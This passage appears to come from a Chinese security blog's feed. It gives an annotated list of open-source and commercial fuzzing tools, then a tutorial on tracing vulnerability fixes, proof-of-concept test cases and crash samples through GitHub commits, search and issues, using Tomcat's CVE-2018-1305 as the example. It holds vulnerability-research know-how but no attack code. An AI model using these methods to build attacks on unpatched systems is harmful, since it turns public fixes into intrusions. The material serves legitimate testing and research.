rel="noopener">https://github.com/OpenRCE/sulley</a><br>Sulley是一个积极开发的模糊引擎和模糊测试框架，由多个可扩展组件组成。Sulley（IMHO）超过了此前公布的大所属模糊技术、商业和公共领域的能力。框架的目标是不仅是可以简化数据表示，而且也可以简化数据传输和仪表。Sulley是以 Monsters Inc.的生物来命名的，因为，他是模糊的。写在python内的。</p></li><li><p>Sulley_l2:<br><a href="http://ernw.de/download/sulley_l2.tar.bz2" target="_blank" rel="noopener">http://ernw.de/download/sulley_l2.tar.bz2</a><br>有些人可能记得2008年发布的sulley_l2，它是sulley模糊框架的修改版本，增强了第2层发送功能和一堆（L2）模糊脚本。所有的blinking, rebooting, mem-corrupting引起了我们的一些关注。从那以后，我们继续写和使用这些模糊脚本，所以它的洞集合增长了。</p></li><li><p>CERT Basic Fuzzing Framework (BFF)For linux, OSX<br><a href="https://github.com/CERTCC-Vulnerability-Analysis/certfuzz" target="_blank" rel="noopener">https://github.com/CERTCC-Vulnerability-Analysis/certfuzz</a><br><a href="http://www.cert.org/vulnerability-analysis/tools/bff.cfm" target="_blank" rel="noopener">http://www.cert.org/vulnerability-analysis/tools/bff.cfm</a><br>cert基本模糊框架（BFF）是一个软件测试工具，它用于在linux和mac os x平台上运行的应用程序中寻找漏洞。BFF对消耗文件输入的软件执行突变性的模糊测试。（突变性模糊测试是采取形式良好的输入数据并以各种方式破坏它的行为，寻找导致崩溃的情况。）BFF自动收集导致了软件以独特方式使测试用例崩溃，以及利用崩溃来调试信息。BFF的目标是去最小化软件供应商和安全研究人员通过模糊测试有效地发现和分析发现的安全漏洞过程中所需要的努力。</p></li><li><p>CERT Failure Observation Engine (FOE)For windows<br><a href="http://www.cert.org/vulnerability-analysis/tools/foe.cfmhttps://github.com/CERTCC-Vulnerability-Analysis/certfuzz" target="_blank" rel="noopener">http://www.cert.org/vulnerability-analysis/tools/foe.cfmhttps://github.com/CERTCC-Vulnerability-Analysis/certfuzz</a><br>The cert Failure Observation Engine (FOE) 是一个软件测试工具，它被用于在Windows平台上运行的应用程序中发现漏洞。FOE在消耗文件输入的软件上执行突变模糊测试。（突变性模糊测试是采取形式良好的输入数据并以各种方式破坏它的行为，寻找导致崩溃的情况。）FOE自动收集导致了软件以独特方式使测试用例崩溃，以及利用崩溃来调试信息。FOE的目标是去最小化软件供应商和安全研究人员通过模糊测试有效地发现和分析发现的安全漏洞过程中所需要的努力。</p></li><li><p>DranzerFor ActiveX Controls.<br><a href="https://github.com/CERTCC-Vulnerability-Analysis/dranzer" target="_blank" rel="noopener">https://github.com/CERTCC-Vulnerability-Analysis/dranzer</a><br>Dranzer是一个工具，使用户能够检查有效的技术，它用于模糊测试ActiveX控件</p></li><li><p>Radamsaa general purpose fuzzer<br><a href="https://github.com/aoh/radamsa" target="_blank" rel="noopener">https://github.com/aoh/radamsa</a><br>Radamsa是一个用于鲁棒性测试的测试用例生成器，也称为fuzzer。它可以用来测试一个程序是否可以承受格式错误以及潜在的恶意输入。它通过制造文件来工作（有趣的不同于通常给定的文件），然后将修改的文件提供给Target程序，或者这样或通过一些脚本。radamsa的主要卖点（而不是其他的模糊器）是：它是非常容易在大多数机器上运行，而且很容易从命令行脚本，这已经被用来找到程序中的一系列安全问题，而且你可能现在正在使用。</p></li><li><p>zzufApplication fuzzer<br><a href="https://github.com/samhocevar/zzuf" target="_blank" rel="noopener">https://github.com/samhocevar/zzuf</a><br>zzuf是一个透明的应用程序输入模糊器。 它的工作原理是截取文件操作并更改程序输入中的随机位。zzuf的行为是确定性的，使得它很容易再现错误。 有关如何使用zzuf的说明和示例，请参阅手册页和网站<a href="http://caca.zoy.org/wiki/zzuf" target="_blank" rel="noopener">http://caca.zoy.org/wiki/zzuf</a></p></li><li><p>Backfuzz<br><a href="https://github.com/localh0t/backfuzz" target="_blank" rel="noopener">https://github.com/localh0t/backfuzz</a><br>Backfuzz是一个用python写成的有着不同协议（FTP，HTTP，IMAP等）的模糊工具。因为一般的想法是这个脚本有几个预定义的功能，所以谁想要编写自己的插件（为另一个协议）就可以在一些行这样做。</p></li><li><p>KEMUfuzzer<br><a href="https://github.com/jrmuizel/kemufuzzer" target="_blank" rel="noopener">https://github.com/jrmuizel/kemufuzzer</a><br>KEmuFuzzer是一个基于仿真或直接本地执行测试系统虚拟机的工具。 目前KEmuFuzzer支持：BHOCS，QEMU，VMware和virtualbox。</p></li><li><p>Pathgrind<br><a href="https://github.com/codelion/pathgrind" target="_blank" rel="noopener">https://github.com/codelion/pathgrind</a><br>Pathgrind使用基于路径的动态分析来fuzz linux / unix二进制。 它是基于valgrind被写在python内的。</p></li><li><p>Wadi-fuzzer<br><a href="https://www.sensepost.com/blog/2015/wadi-fuzzer/" target="_blank" rel="noopener">https://www.sensepost.com/blog/2015/wadi-fuzzer/</a> <a href="https://gitlab.sensepost.com/saif/DOM-Fuzzer" target="_blank" rel="noopener">https://gitlab.sensepost.com/saif/DOM-Fuzzer</a><br>Wadi是基于web浏览器语法的模糊器。 这个语法用于描述浏览器应该如何处理Web内容，Wadi转向并使用语法来打破浏览器。<br>Wadi是一个Fuzzing模块，用于NodeFuzz fuzzing Harness并利用AddressSanitizer（ASan）在Linux和Mac OSX上进行测试。<br>万维网联盟（W3C）是一个国际组织，它开发开放标准以确保Web的长期增长。 W3C允许我们搜索语法并在我们的测试用例中使用。</p></li><li><p>LibFuzzer, Clang-format-fuzzer, clang-fuzzer<br><a href="http://llvm.org/docs/LibFuzzer.html" target="_blank" rel="noopener">http://llvm.org/docs/LibFuzzer.html</a><br><a href="http://llvm.org/viewvc/llvm-project/cfe/trunk/tools/clang-format/fuzzer/ClangFormatFuzzer.cpp?view=markup" target="_blank" rel="noopener">http://llvm.org/viewvc/llvm-project/cfe/trunk/tools/clang-format/fuzzer/ClangFormatFuzzer.cpp?view=markup</a><br><a href="http://llvm.org/viewvc/llvm-project/cfe/trunk/tools/clang-fuzzer/ClangFuzzer.cpp?view=markup" target="_blank" rel="noopener">http://llvm.org/viewvc/llvm-project/cfe/trunk/tools/clang-fuzzer/ClangFuzzer.cpp?view=markup</a><br>我们在LibFuzzer上实现了两个模糊器：clang-format-fuzzer和clang-fuzzer。Clang格式大多是一个词法分析器，所以给它随机字节格式是会完美运行的，但也伴随着超过20个错误。然而Clang不仅仅是一个词法分析器，给它随机字节时几乎没有划伤其表面，所以除了测试随机字节，我们还在令牌感知模式中模糊了Clang。两种模式中都发现了错误; 其中一些以前被AFL检测到，另一些则不是：我们使用AddressSanitizer运行这个模糊器，结果发现一些错误在没有它的情况下不容易被发现。</p></li><li><p>Perf-fuzzer<br><a href="http://www.eece.maine.edu/~vweaver/projects/perf_events/validation/https://github.com/deater/perf_event_testshttp://web.eece.maine.edu/~vweaver/projects/perf_events/fuzzer/" target="_blank" rel="noopener">http://www.eece.maine.edu/~vweaver/projects/perf_events/validation/https://github.com/deater/perf_event_testshttp://web.eece.maine.edu/~vweaver/projects/perf_events/fuzzer/</a><br>用于Linux perf_event子系统的测试套件</p></li><li><p>HTTP/2 Fuzzer<br><a href="https://github.com/c0nrad/http2fuzz" target="_blank" rel="noopener">https://github.com/c0nrad/http2fuzz</a><br>HTTP2模糊器内置于Golang。</p></li><li><p>QuickFuzz<br><a href="http://quickfuzz.org/" target="_blank" rel="noopener">http://quickfuzz.org/</a><br>QuickFuzz是一个语法模糊器，由QuickCheck，模板Haskell和Hackage的特定库生成许多复杂的文件格式，如Jpeg，Png，Svg，Xml，Zip，Tar和更多！ QuickFuzz是开源的（GPL3），它可以使用其他错误检测工具，如zzuf，radamsa，honggfuzz和valgrind。</p></li><li><p>SymFuzz<br><a href="https://github.com/maurer/symfuzz" target="_blank" rel="noopener">https://github.com/maurer/symfuzz</a><br><a href="http://ieeexplore.ieee.org/xpls/abs_all.jsp?arnumber=7163057" target="_blank" rel="noopener">http://ieeexplore.IEEE.org/xpls/abs_all.jsp?arnumber=7163057</a><br>摘要？我们提出了一个算法的设计，以最大化数量的bug为黑盒子突变性的模糊给定一个程序和种子的输入。主要的直观性的是利用给定程序 - 种子对的执行轨迹上的白盒符号进行分析，来检测输入的BIT位置之间的依赖性，然后使用这种依赖关系来为该程序种子对计算概率上最佳的突变比率。我们的结果是有希望的：我们发现使用相同的模糊时间，这比8个应用程序中的三个以前的模糊器的平均错误多38.6％。</p></li><li><p>OFuzz<br><a href="https://github.com/sangkilc/ofuzz" target="_blank" rel="noopener">https://github.com/sangkilc/ofuzz</a><br>OFuzz是一个用OCaml编写的模糊平台。 OFuzz目前专注于在* nix平台上运行的文件处理应用程序。 OFuzz的主要设计原则是灵活性：必须容易添加/替换模糊组件（崩溃分类模块，测试用例生成器等）或算法（突变算法，调度算法）。</p></li><li><p>Bed<br><a href="http://www.snake-basket.de/" target="_blank" rel="noopener">http://www.snake-basket.de/</a><br>网络协议fuzzer。 BED是一个程序，旨在检查守护程序的潜在缓冲区溢出、格式字符串等。</p></li><li><p>Neural Fuzzer<br><a href="https://cifasis.github.io/neural-fuzzer/" target="_blank" rel="noopener">https://cifasis.github.io/neural-fuzzer/</a><br>神经模糊测试工具是一种实验性模糊器，它被设计使用国家最先进的机器，从一组初始文件学习。 它分为两个阶段：训练和生成。</p></li><li><p>Pulsar<br><a href="https://github.com/hgascon/pulsar" target="_blank" rel="noopener">https://github.com/hgascon/pulsar</a><br>协议学习，模拟和状态模糊器<br>Pulsar是一个具有自动协议学习和模拟能力的网络模糊器。该工具允许通过机器学习技术来建模协议，例如聚类和隐马尔可夫模型。这些模型可以用于模拟Pulsar与真实客户端或服务器之间进行通信，这些消息，在一系列模糊原语的结合下，让测试一个未知协议错误的实施在更深的状态协议。</p></li><li><p>D-bus fuzzer:<br><a href="https://github.com/matusmarhefka/dfuzzer" target="_blank" rel="noopener">https://github.com/matusmarhefka/dfuzzer</a><br>dfuzzer是D-Bus模糊器，是用于通过D-Bus进行通信的模糊测试过程的工具。它可以用于测试连接到会话总线和系统总线守护程序的进程。模糊器为客户端工作，它首先连接到总线守护进程，然后它遍历并模糊测试由D-Bus服务提供的所有方法。</p></li><li><p>Choronzon<br><a href="https://census-labs.com/news/2016/07/20/choronzon-public-release/" target="_blank" rel="noopener">https://census-labs.com/news/2016/07/20/choronzon-public-release/</a><br>Choronzon是一个进化型的模糊工具。它试图模仿进化过程，以保持产生更好的结果。 为了实现这一点，它具有评估系统的能力，用以分类哪些模糊文件是有趣的，哪些应该被丢弃。<br>此外，Choronzon是一个基于知识的模糊器。 它使用用户定义的信息来读取和写入目标文件格式的文件。要熟悉Choronzon的术语，您应该考虑每个文件由染色体表示。用户应该描述所考虑的文件格式的基本结构， 优选文件格式的高级概述，而不是描述它的每个细节和方面。那些用户定义的基本结构中的每一个都被认为是基因， 每个染色体包含一个基因树，并且它能够从中构建相应的文件。</p></li><li><p>Exploitable  </p><p><img src="/2018/10/27/Fuzzing技术总结与工具列表/20180831153311803.jpeg" alt="20180831153311803"><br>‘exploitable’是一个GDB扩展，它会按严重性分类Linux应用程序错误。扩展检查已崩溃的Linux应用程序的状态，并输出攻击者利用底层软件错误获得系统控制有多困难的总结。扩展可以用于为软件开发人员确定bug的优先级，以便他们可以首先解决最严重的bug。<br>该扩展实现了一个名为“exploitable”的GDB命令。 该命令使用启发式来描述当前在GDB中调试的应用程序的状态的可利用性。 该命令旨在用于包含GDB Python API的Linux平台和GDB版本。 请注意，此时命令将无法在核心文件目标上正确运行。</p></li><li><p>Hodor</p><p><img src="/2018/10/27/Fuzzing技术总结与工具列表/20180831153322807.jpeg" alt="20180831153322807"><br>我们想设计一个通用的模糊器，可以用来配置使用已知的良好的输入和分隔符，以模糊特定的位置。在一个完全愚钝的模糊器和一些更聪明的东西之间，与实现适当的智能模糊器相比，表现着更少的努力。</p></li><li><p>BrundleFuzz<br><a href="https://github.com/carlosgprado/BrundleFuzz" target="_blank" rel="noopener">https://github.com/carlosgprado/BrundleFuzz</a><br>BrundleFuzz是一个用于Windows和Linux的分布式模糊器，使用动态二进制仪器。</p></li><li><p>Netzob<br><a href="https://www.netzob.org/" target="_blank" rel="noopener">https://www.netzob.org/</a><br>用于通信协议的逆向工程、流量生成和模糊化的开源工具</p></li><li><p>PassiveFuzzFrameworkOSX<br>该框架用于在内核模式下基于被动内联挂钩机制来模糊OSX内核漏洞。</p></li><li><p>syntribos<br>OpenStack安全组的Python API安全测试工具</p></li><li><p>honggfuzz<br><a href="http://google.github.io/honggfuzz/" target="_blank" rel="noopener">http://google.github.io/honggfuzz/</a><br>一个通用的，易于使用的有趣的分析选项的模糊器。 支持基于代码覆盖率的反馈驱动的模糊测试</p></li><li><p>dotdotpwn<br><a href="http://dotdotpwn.blogspot.com/" target="_blank" rel="noopener">http://dotdotpwn.blogspot.com/</a><br>目录遍历模糊工具</p></li><li><p>KernelFuzzer<br>跨平台内核Fuzzer框架。DEF CON 24视频：<br><a href="https://www.youtube.com/watch?v=M8ThCIfVXow" target="_blank" rel="noopener">https://www.youtube.com/watch?v=M8ThCIfVXow</a></p></li><li><p>PyJFuzz<br>PyJFuzz - Python JSON Fuzzer<br>PyJFuzz是一个小的、可扩展的和现成可用的框架，用于模糊JSON输入，如移动端点REST API，JSON实现，浏览器，cli可执行和更多。</p></li><li><p>RamFuzz<br>单个方法参数的模糊器。</p></li><li><p>EMFFuzzer<br>基于桃树模糊框架的增强的元文件模糊器</p></li><li><p>js-fuzz<br>一个基于javascript的AFL启发的遗传模糊测试器。</p></li><li><p>syzkaller<br>syzkaller是一个无监督的、覆盖引导的Linux系统调用模糊器。</p></li></ol><p><strong>二、模糊线束/框架使fuzzer提高：</strong></p><ol><li><p>FuzzFlow<br>Fuzzflow是来自cisco talos的一个分布式的模糊管理框架，它提供虚拟机管理，模糊作业配、可插拔变异引擎、前/后变形脚本、崩溃收集和可插拔崩溃分析。</p></li><li><p>fuzzinator<br>Fuzzinator是一个模糊测试框架，可以帮助你自动化任务，它通常需要在一个fuzz会话：<br>运行您最喜欢的测试生成器并将测试用例馈送到测试中的系统，<br>抓住和保存独特的问题，<br>减少失败的测试用例，<br>缓解错误跟踪器中的问题报告（例如，Bugzilla或GitHub），<br>如果需要，定期更新SUT<br>计划多个SUT和发电机，而不会使工作站超载。</p></li><li><p>Fuzzlabs<br><a href="https://github.com/DCNWS/FuzzLabs" target="_blank" rel="noopener">https://github.com/DCNWS/FuzzLabs</a><br>FuzzLabs在一个模块化的模糊框架中，用Python编写。 它使用了令人惊叹的Sulley模糊框架的修改版本作为核心引擎。 FuzzLabs仍在开发中。</p></li><li><p>Nodefuzz<br><a href="https://github.com/attekett/NodeFuzz" target="_blank" rel="noopener">https://github.com/attekett/NodeFuzz</a><br>对于Linux和Mac OSX。 NodeFuzz是一个用于网络浏览器和类似浏览器的应用程序的模糊器。 NodeFuzz背后有两个主要的想法：第一是创建一个简单、快速、不同浏览器的fuzz方法。 第二，有一个线束，可以轻松地扩展与新的测试用例发生器和客户端仪器，无需修改核心。</p></li><li><p>Grinder<br><a href="https://github.com/stephenfewer/grinder" target="_blank" rel="noopener">https://github.com/stephenfewer/grinder</a><br>对于windows Grinder是一个自动化浏览器的模糊化和大量崩溃管理的系统。</p></li><li><p>Kitty<br><a href="https://github.com/Cisco-sas/kitty" target="_blank" rel="noopener">https://github.com/Cisco-sas/kitty</a><br>Kitty是一个开源的模块化和可扩展的模糊框架，使用python编写，灵感来自OpenRCE的Sulley和Michael Eddington（现在是Deja vu Security的）Peach Fuzzer。</p></li><li><p>Peach<br><a href="http://community.peachfuzzer.com/" target="_blank" rel="noopener">http://community.peachfuzzer.com/</a><br><a href="https://github.com/MozillaSecurity/peach" target="_blank" rel="noopener">https://github.com/MozillaSecurity/peach</a><br>Peach是一个SmartFuzzer，能够执行基于生成和基于突变的模糊测试。</p></li></ol><p><strong>三、此外，还有这些免费的但不是开源的fuzzer：</strong></p><ol><li><p>SDL MiniFuzz File Fuzzer<br><a href="https://www.microsoft.com/en-us/download/details.aspx?id=21769" target="_blank" rel="noopener">https://www.Microsoft.com/en-us/download/details.aspx?id=21769</a><br>对于Windows。 SDL MiniFuzz File Fuzzer是一个基本的文件模糊工具，旨在简化非安全开发人员对模糊测试的采用，这些非安全开发人员不熟悉文件模糊工具或从未在当前的软件开发过程中使用它们。</p></li><li><p>Rfuzz<br><a href="http://rfuzz.rubyforge.org/index.html" target="_blank" rel="noopener">http://rfuzz.rubyforge.org/index.html</a><br>RFuzz是一个Ruby库，可以使用快速HttpClient和wicked vil RandomGenerator轻松地从外部测试Web应用程序，它允许普通程序员每天使用先进的模糊技术。</p></li><li><p>Spike<br><a href="http://www.immunitysec.com/downloads/SPIKE2.9.tgz" target="_blank" rel="noopener">http://www.immunitysec.com/downloads/SPIKE2.9.tgz</a><br>SPIKE是一个API框架，允许你编写模糊器。</p></li><li><p>Regex Fuzzer<br><a href="http://go.microsoft.com/?linkid=9751929" target="_blank" rel="noopener">http://go.microsoft.com/?linkid=9751929</a><br>DL Regex Fuzzer是一个验证工具，用于帮助测试正则表达式是否存在潜在的拒绝服务漏洞。它包含用指数时间执行的某些子句的正则表达式模式（例如，包含自身重复的重复的子句）可以被攻击者利用来引起拒绝服务（DoS）条件。SDL Regex Fuzzer与SDL过程模板和MSF-Agile + SDL过程模板集成，以帮助用户跟踪和消除其项目中的任何检测到的正则表达式漏洞。</p></li></ol><p><strong>四、博客，将帮助你fuzz更好</strong></p><ol><li><p>Yawml的开始到完成模糊与AFL（一个完整的fuzzjob由foxglovesecurity）<br><a href="http://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/" target="_blank" rel="noopener">http://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/</a></p></li><li><p>Fuzz更聪明，更难 - 用afl引发模糊，来自bsidessf2016的引物<br><a href="https://www.peerlyst.com/posts/bsidessf-2016-recap-of-fuzz-smarter-not-harder-an-afl-primer-claus-cramon" target="_blank" rel="noopener">https://www.peerlyst.com/posts/bsidessf-2016-recap-of-fuzz-smarter-not-harder-an-afl-primer-claus-cramon</a></p></li><li><p>Fuzzing和afl是一种艺术<br>Fuzzing nginx 和 American Fuzzy Lop<br>您可以在此处的评论或此Google文档中发表建议：<br><a href="https://docs.google.com/document/d/17pZxfs8hXBCnhfHoKfJ7JteGziNB2V_VshsVxmNRx6U/edit?usp=sharing" target="_blank" rel="noopener">https://docs.google.com/document/d/17pZxfs8hXBCnhfHoKfJ7JteGziNB2V_VshsVxmNRx6U/edit?usp=sharing</a></p></li><li><p>BSidesLisbon 2016主题演讲：智能模糊器革命<br>Windows内核模糊初学者 - Ben Nagy</p></li></ol><p><strong>五、其他Fuzzer博客：</strong><br>循环使用编译器转换的模糊包版<br>谷歌推出了OSS-Fuzz（感谢Dinko Cherkezov） - 一个项目，旨在不断开发开源项目fuzz：<br>OSS-Fuzz现在正在测试中，并即将接受候选开源项目的建议。为了使项目被OSS-Fuzz接受，它需要有一个庞大的用户基础或针对于至关重要的全球IT基础设施，这是一个通用启发式方法，我们有意在这个早期阶段解释。查看更多详情和说明如何在这里申请。<br>一旦项目注册了OSS-Fuzz，它将自动接收到我们的跟踪器中，新报告的错误披露截止于90天后（见此处的详细信息）。 这符合行业的最佳实践，并通过更快地为用户提供补丁来提高最终用户的安全性和稳定性。<br>帮助我们确保这个程序真正服务于开源社区和依赖这个关键软件的互联网，贡献和留下您的反馈在GitHub。</p><p><img src="/2018/10/27/Fuzzing技术总结与工具列表/20180831152729200.jpeg" alt="20180831152729200"></p><p><strong>六、商业模糊器</strong></p><p>超越安全的暴风雨<br><a href="http://www.beyondsecurity.com/bestorm_and_the_SDL.html" target="_blank" rel="noopener">http://www.beyondsecurity.com/bestorm_and_the_SDL.html</a><br>管理员编辑：查找更多真棒Peerlyst社区贡献的资源，资源目录在这里。<br><img src="/2018/10/27/Fuzzing技术总结与工具列表/20180831152655664.jpeg" alt="20180831152655664"></p><p><strong>七、关于浏览器的Fuzzing</strong></p><ol><li><p>Skyfire 一种用于Fuzzing的数据驱动的种子生成工具<br><a href="https://www.inforsec.org/wp/?p=2678" target="_blank" rel="noopener">https://www.inforsec.org/wp/?p=2678</a><br><a href="https://www.ieee-security.org/TC/SP2017/papers/42.pdf" target="_blank" rel="noopener">https://www.ieee-security.org/TC/SP2017/papers/42.pdf</a></p></li><li><p>使用libFuzzer fuzz Chrome V8入门指南<br><a href="http://www.4hou.com/info/news/6191.html" target="_blank" rel="noopener">http://www.4hou.com/info/news/6191.html</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>利用Github辅助漏洞分析</title>
      <link href="/2018/10/26/%E5%88%A9%E7%94%A8Github%E8%BE%85%E5%8A%A9%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2018/10/26/%E5%88%A9%E7%94%A8Github%E8%BE%85%E5%8A%A9%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>来自于lcatro师傅的分享，原文地址如下：<br><a href="https://github.com/lcatro/How-to-Read-Source-and-Fuzzing/blob/master/1.Github.md" target="_blank" rel="noopener">https://github.com/lcatro/How-to-Read-Source-and-Fuzzing/blob/master/1.Github.md</a></p><h2 id="必备工具"><a href="#必备工具" class="headerlink" title="必备工具"></a>必备工具</h2><p>  Git ,Github</p><h2 id="从Github-开始"><a href="#从Github-开始" class="headerlink" title="从Github 开始"></a>从Github 开始</h2><p>  Github 是代码分享平台,使用Github 能够找到很多开源项目,关于Github 不多做介绍了,下面分享些使用Github 读代码的操作</p><h2 id="Github-commits"><a href="#Github-commits" class="headerlink" title="Github commits"></a>Github commits</h2><p>  Github commits 的功能是用来记录每一次Git 提交代码的信息,里面包含了修改代码的原因,还有修改了哪些代码.Github commits 的功能在这里</p><p> <img src="/2018/10/26/利用Github辅助漏洞分析/github_commit.png" alt="github_commit">  </p><p>  点击之后,可以看到很多Git 提交代码的记录</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/github_commit_info.png" alt="github_commit_info"></p><p>  随意点开一条记录,可以看到很多关于这条Commit 的信息</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/github_commit_record.png" alt="github_commit_record"></p><p>  使用Github commits 有一个操作就是:<strong>一般来说,部分安全告警或者存在特别严重漏洞的开源项目向外发出通知的时候,往往只是提醒漏洞是影响了哪些版本,什么时候修复,要更新到最新的版本.关于漏洞的详情是很少提及的,甚至PoC 也没有.那么这个时候要怎么去研究漏洞呢?答案是追踪Commit 提交记录</strong></p><p>  以CVE-2018-1305 为例子,关于绿盟的对外的通告如下(其他通告都大同小异):</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/nsfocus_record.png" alt="nsfocus_record"></p><p>  里面只有一个邮件通信记录,我们进去看看有什么(<a href="https://lists.apache.org/thread.html/d3354bb0a4eda4acc0a66f3eb24a213fdb75d12c7d16060b23e65781@%3Cannounce.tomcat.apache.org%3E" target="_blank" rel="noopener">https://lists.apache.org/thread.html/d3354bb0a4eda4acc0a66f3eb24a213fdb75d12c7d16060b23e65781@%3Cannounce.tomcat.apache.org%3E</a>)</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/CVE-2018-1305_email.png" alt="CVE-2018-1305_emai"></p><p>  邮件最下面有个References ,翻译为中文是引用的意思,在这里多插一句话:文章里面的引用一般是拓展阅读或者理论/数据的来源依据,如果读者需要进一步去深入这个文章,引用来源就是最好的入手点**.我们挑其中一个引用的URL 来看看(<a href="http://tomcat.apache.org/security-9.html),下面是我挑出的重点信息" target="_blank" rel="noopener">http://tomcat.apache.org/security-9.html),下面是我挑出的重点信息</a></p><p><img src="/2018/10/26/利用Github辅助漏洞分析/CVE-2018-1305_info.png" alt="CVE-2018-1305_info"></p><p>  圆圈里的意思是漏洞的描述,方框里标明的是其他有用的信息:影响的版本(Affects: 9.0.0.M1 to 9.0.4),最新修复的版本号(Fixed in Apache Tomcat 9.0.5),公开漏洞的时间(11 February 2018),Commit ID (This was fixed in revisions 1823310 and 1824323.).</p><p>  找到Commit ID ,点进去看看,这个时候就跳转到了Apache 的SVN Commit 记录里边了(<a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1823310).[PS:SVN" target="_blank" rel="noopener">http://svn.apache.org/viewvc?view=revision&amp;revision=1823310).[PS:SVN</a> 和Git 都是版本管理工具]</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/CVE-2018-1305_svn_commit.png" alt="CVE-2018-1305_svn_commit"></p><p>  我们可以看到这次修复漏洞修改了哪些代码.但是点进去代码里看,也没有diff ,所以现在回到Git commits 里继续找修复代码的Commit .那么要怎么去找Commit 呢?这个时候,漏洞修复时间就派上用场了.</p><p>  SVN 的Commit 里面有一个Commit 时间(如果没有找到对应的Commit ,就在漏洞报告时间(2018/2/1)到漏洞公开时间(2018/2/23)搜索Commit )</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/CVE-2018-1305_fix_time.png" alt="CVE-2018-1305_fix_time"></p><p>  然后去找Commit ,发现没有找到</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/CVE-2018-1305_master_commit.png" alt="CVE-2018-1305_master_commit"></p><p>  这就很迷了,为啥会找不到呢.读者们回到主页,点击这里</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/github_version.png" alt="github_version"></p><p>  这个时候,漏洞影响版本号就派上用场了,嘿嘿嘿</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/github_version_select.png" alt="github_version_select"></p><p>  …这里找了个遍都没有找到这个版本,太神奇了,咱们再细细看看漏洞信息哈</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/tips_tomcat.png" alt="tips_tomcat"></p><p>  ??? 难道tomcat 和apache 是不同的?那我去搜索一下tomcat [PS:Github 搜索有很多很有趣的使用套路,待会和大家分享一个学习漏洞原理的骚操作]</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/github_search.png" alt="github_search"></p><p><img src="/2018/10/26/利用Github辅助漏洞分析/github_tomcat.png" alt="github_tomcat"></p><p>  看来找错了开源项目,那就先看看版本分支吧</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/tomcat_trunk.png" alt="tomcat_trunk"></p><p>  有些开源项目是有设置不同的版本分支管理的,没有也没关系,那就来找Commit 吧</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/CVE-2018-1305_git_commit.png" alt="CVE-2018-1305_git_commit"></p><p>  现在已经定位到了2018/2/6 号的Commit 信息,这里有几个Commit ,一个一个慢慢看吧,搜素的过程就不多说了,最后定位到这两个Commit</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/CVE-2018-1305_git_commit_1.png" alt="CVE-2018-1305_git_commit_1"></p><p>  修复代码:<a href="https://github.com/apache/tomcat/commit/3e54b2a6314eda11617ff7a7b899c251e222b1a1" target="_blank" rel="noopener">https://github.com/apache/tomcat/commit/3e54b2a6314eda11617ff7a7b899c251e222b1a1</a><br>  测试用例:<a href="https://github.com/apache/tomcat/commit/af0c19ffdbe525ad690da4fd7e988c7788d00141" target="_blank" rel="noopener">https://github.com/apache/tomcat/commit/af0c19ffdbe525ad690da4fd7e988c7788d00141</a></p><p>  在Git 的Commit 里还能看到Diff ,很容易就知道到底哪些代码被修改过(包括代码注释)</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/CVE-2018-1305_git_diff.png" alt="CVE-2018-1305_git_diff"></p><p>  在测试用例里面就可以直接找到PoC 了</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/CVE-2018-1305_test_case.png" alt="CVE-2018-1305_test_case"></p><h2 id="Github-Search"><a href="#Github-Search" class="headerlink" title="Github Search"></a>Github Search</h2><p>  前面已经说到了如何使用Commit 了,相信读者也已经去秀了一波操作,找到更多关于漏洞修复的细节,上一节有提到,关于Github Search 有一个学习代码的骚操作,当年我就是用这一招弄明白了JavaScript 这种脚本解析引擎的漏洞应该要怎么挖,是不是很想知道到底是啥套路.</p><p>  在搜索框里输入<code>CVE</code> ,记住,要想挖哪个开源项目就去那个开源项目的Github 上搜素CVE 三个字</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/github_search_cve.png" alt="github_search_cve"></p><p><img src="/2018/10/26/利用Github辅助漏洞分析/github_search_cve_result.png" alt="github_search_cve_result"></p><p>  结果如上,这个是Code 搜素,搜素出来的结果比较少,咱们切换到Commits 来看看</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/github_search_cve_commit_result.png" alt="github_search_cve_commit_result"></p><p>  是不是发现了新世界 :)</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/github_search_1.png" alt="github_search_1"></p><p><img src="/2018/10/26/利用Github辅助漏洞分析/github_search_2.png" alt="github_search_2"></p><p><img src="/2018/10/26/利用Github辅助漏洞分析/github_search_3.png" alt="github_search_3"></p><p>  洞海无涯苦作舟,用这种方法可以从issus 和Commit 里面学到很多,但是要看懂整个Commit 不只是要看Diff ,还要下载代码到本地一步一步分析漏洞成因</p><h2 id="Github-Issus"><a href="#Github-Issus" class="headerlink" title="Github Issus"></a>Github Issus</h2><p>  Issus 可以看到很多漏洞挖掘的操作,特别是AFL 和libFuzzer 的怎么样使用的,同时在这些提交漏洞的Issus 里还能收集到很多样本,可以直接拿下来到其他的开源项目里继续使用,举个例子,ImageMagick 的Issus :<a href="https://github.com/ImageMagick/ImageMagick/issues" target="_blank" rel="noopener">https://github.com/ImageMagick/ImageMagick/issues</a></p><p><img src="/2018/10/26/利用Github辅助漏洞分析/github_issus.png" alt="github_issus"></p><p><img src="/2018/10/26/利用Github辅助漏洞分析/github_issus_info.png" alt="github_issus_info"></p><p>  